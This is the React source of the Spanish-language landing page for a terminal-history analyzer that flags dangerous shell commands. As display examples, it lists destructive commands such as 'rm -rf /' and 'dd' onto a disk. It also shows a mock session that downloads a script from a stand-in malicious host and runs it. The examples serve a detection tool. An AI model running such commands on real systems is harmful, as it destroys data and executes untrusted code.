import React from 'react';
import { Link } from 'react-router-dom';
import {
    ShieldCheckIcon,
    DocumentMagnifyingGlassIcon,
    CpuChipIcon,
    ExclamationTriangleIcon,
    ArrowRightIcon,
    CheckCircleIcon
} from '@heroicons/react/24/outline';

const Home = () => {
    const features = [
        {
            icon: CpuChipIcon,
            title: 'Análisis Léxico',
            description: 'Tokenización inteligente de comandos, argumentos, rutas y URLs para identificar cada elemento del historial.',
        },
        {
            icon: DocumentMagnifyingGlassIcon,
            title: 'Análisis Sintáctico',
            description: 'Validación de estructura correcta de comandos de shell, pipes, redirecciones y flags.',
        },
        {
            icon: ExclamationTriangleIcon,
            title: 'Análisis Semántico',
            description: 'Detección de comandos peligrosos, patrones sospechosos y clasificación por niveles de amenaza.',
        },
        {
            icon: ShieldCheckIcon,
            title: 'Detección de Amenazas',
            description: 'Identificación automática de actividades maliciosas con sugerencias de seguridad.',
        },
    ];

    const threatLevels = [
        {
            level: 'CRITICAL',
            color: 'text-red-600',
            bgColor: 'bg-red-50',
            description: 'Comandos extremadamente peligrosos',
            examples: ['rm -rf /', 'dd if=/dev/zero of=/dev/sda'],
        },
        {
            level: 'HIGH',
            color: 'text-orange-600',
            bgColor: 'bg-orange-50',
            description: 'Escalación de privilegios',
            examples: ['sudo su -', 'chmod 777 /'],
        },
        {
            level: 'MEDIUM',
            color: 'text-yellow-600',
            bgColor: 'bg-yellow-50',
            description: 'Actividad de red sospechosa',
            examples: ['wget http://malicious.com', 'ssh root@unknown'],
        },
        {
            level: 'LOW',
            color: 'text-blue-600',
            bgColor: 'bg-blue-50',
            description: 'Actividad que requiere atención',
            examples: ['ssh internal-server', 'curl unknown-api'],
        },
    ];

    const benefits = [
        'Análisis en tiempo real de archivos de historial',
        'Detección automática de patrones maliciosos',
        'Clasificación inteligente por niveles de peligro',
        'Sugerencias de seguridad personalizadas',
        'Soporte para bash, zsh y otros shells',
        'Interfaz web intuitiva y fácil de usar',
    ];

    return (
        <div className="min-h-screen">
            {/* Hero Section */}
            <section className="bg-gradient-to-br from-primary-600 to-primary-800 text-white">
                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-24">
                    <div className="text-center">
                        <ShieldCheckIcon className="h-16 w-16 mx-auto mb-6 text-primary-200" />
                        <h1 className="text-4xl md:text-6xl font-bold mb-6">
                            Terminal History Analyzer
                        </h1>
                        <p className="text-xl md:text-2xl mb-8 text-primary-100 max-w-3xl mx-auto">
                            Analizador léxico, sintáctico y semántico para detectar comandos peligrosos
                            y patrones sospechosos en historiales de terminal
                        </p>
                        <div className="flex flex-col sm:flex-row gap-4 justify-center">
                            <Link
                                to="/analysis"
                                className="bg-white text-primary-600 px-8 py-3 rounded-lg font-semibold hover:bg-gray-100 transition-colors duration-200 flex items-center justify-center"
                            >
                                Comenzar Análisis
                                <ArrowRightIcon className="ml-2 h-5 w-5" />
                            </Link>
                            <Link
                                to="/about"
                                className="border-2 border-white text-white px-8 py-3 rounded-lg font-semibold hover:bg-white hover:text-primary-600 transition-colors duration-200"
                            >
                                Saber Más
                            </Link>
                        </div>
                    </div>
                </div>
            </section>

            {/* Features Section */}
            <section className="py-20 bg-white">
                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                    <div className="text-center mb-16">
                        <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                            Características Principales
                        </h2>
                        <p className="text-xl text-gray-600 max-w-2xl mx-auto">
                            Tres niveles de análisis para una detección completa de amenazas
                        </p>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
                        {features.map((feature, index) => {
                            const Icon = feature.icon;
                            return (
                                <div key={index} className="card text-center hover:shadow-lg transition-shadow duration-200">
                                    <Icon className="h-12 w-12 text-primary-600 mx-auto mb-4" />
                                    <h3 className="text-xl font-semibold text-gray-900 mb-2">
                                        {feature.title}
                                    </h3>
                                    <p className="text-gray-600">
                                        {feature.description}
                                    </p>
                                </div>
                            );
                        })}
                    </div>
                </div>
            </section>

            {/* Threat Levels Section */}
            <section className="py-20 bg-gray-50">
                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                    <div className="text-center mb-16">
                        <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                            Niveles de Amenaza
                        </h2>
                        <p className="text-xl text-gray-600 max-w-2xl mx-auto">
                            Clasificación inteligente de comandos según su nivel de peligro
                        </p>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                        {threatLevels.map((threat, index) => (
                            <div key={index} className={`card ${threat.bgColor} border-l-4 border-l-current ${threat.color}`}>
                                <div className="mb-3">
                  <span className={`text-sm font-bold px-2 py-1 rounded ${threat.color} bg-white`}>
                    {threat.level}
                  </span>
                                </div>
                                <h3 className={`text-lg font-semibold mb-2 ${threat.color}`}>
                                    {threat.description}
                                </h3>
                                <div className="space-y-1">
                                    {threat.examples.map((example, i) => (
                                        <code key={i} className="block text-xs bg-white p-2 rounded font-mono">
                                            {example}
                                        </code>
                                    ))}
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            </section>

            {/* Benefits Section */}
            <section className="py-20 bg-white">
                <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
                        <div>
                            <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-6">
                                ¿Por qué usar Terminal Analyzer?
                            </h2>
                            <p className="text-lg text-gray-600 mb-8">
                                Una herramienta completa para analizar la seguridad de tus historiales
                                de terminal y detectar actividades potencialmente peligrosas.
                            </p>
                            <ul className="space-y-4">
                                {benefits.map((benefit, index) => (
                                    <li key={index} className="flex items-start">
                                        <CheckCircleIcon className="h-6 w-6 text-green-500 mr-3 mt-0.5 flex-shrink-0" />
                                        <span className="text-gray-700">{benefit}</span>
                                    </li>
                                ))}
                            </ul>
                        </div>

                        <div className="bg-gray-900 rounded-lg p-6 text-green-400 font-mono text-sm">
                            <div className="mb-4">
                                <span className="text-gray-500">$ </span>
                                <span>cd /home/user</span>
                            </div>
                            <div className="mb-4">
                                <span className="text-gray-500">$ </span>
                                <span>ls -la</span>
                            </div>
                            <div className="mb-4 text-red-400">
                                <span className="text-gray-500">$ </span>
                                <span>sudo rm -rf /tmp/*</span>
                                <span className="ml-2 text-xs bg-red-600 text-white px-2 py-1 rounded">HIGH</span>
                            </div>
                            <div className="mb-4 text-orange-400">
                                <span className="text-gray-500">$ </span>
                                <span>curl -o script.sh http://malicious.com</span>
                                <span className="ml-2 text-xs bg-orange-600 text-white px-2 py-1 rounded">MEDIUM</span>
                            </div>
                            <div className="mb-4 text-red-400">
                                <span className="text-gray-500">$ </span>
                                <span>chmod +x script.sh && ./script.sh</span>
                                <span className="ml-2 text-xs bg-red-600 text-white px-2 py-1 rounded">CRITICAL</span>
                            </div>
                            <div className="text-gray-500 text-xs mt-4">
                                ✓ Análisis completado - 3 amenazas detectadas
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* CTA Section */}
            <section className="py-20 bg-primary-600 text-white">
                <div className="max-w-4xl mx-auto text-center px-4 sm:px-6 lg:px-8">
                    <h2 className="text-3xl md:text-4xl font-bold mb-6">
                        ¿Listo para analizar tu historial?
                    </h2>
                    <p className="text-xl text-primary-100 mb-8">
                        Sube tu archivo de historial o pega comandos directamente para comenzar el análisis
                    </p>
                    <Link
                        to="/analysis"
                        className="bg-white text-primary-600 px-8 py-4 rounded-lg font-semibold text-lg hover:bg-gray-100 transition-colors duration-200 inline-flex items-center"
                    >
                        Comenzar Ahora
                        <ArrowRightIcon className="ml-2 h-5 w-5" />
                    </Link>
                </div>
            </section>
        </div>
    );
};

export default Home;